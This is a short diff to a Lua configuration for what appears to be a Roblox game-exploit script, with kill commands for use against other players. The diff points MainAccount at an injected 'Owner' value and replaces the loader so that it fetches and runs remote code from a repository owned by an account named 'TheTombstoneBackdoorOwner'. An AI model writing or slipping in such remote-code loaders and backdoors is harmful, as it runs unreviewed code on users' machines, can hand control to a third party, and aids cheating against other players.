@@ -1,5 +1,7 @@
+local Owner = GetGenv().Owner
+
 getgenv().ScriptSettings = {
-    MainAccount = "",  -- Main account username
+    MainAccount = Owner,  -- Main account username
     Configs = {
         Prefix = "",  ---REMEMBER THIS PREFIX
         Mask = "", 
@@ -67,4 +69,4 @@ getgenv().ScriptCommands = {
     ["Clear Multi Kill"] = "ckill",
     ["Loop Gun Multi Player"] = "slgkill",
 }
-loadstring(game:HttpGet("https://raw.githubusercontent.com/yuvic123/Skidov1.2-stand/refs/heads/main/Skidov1.3-Stand"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mango-Stand/refs/heads/main/loader.txt"))()
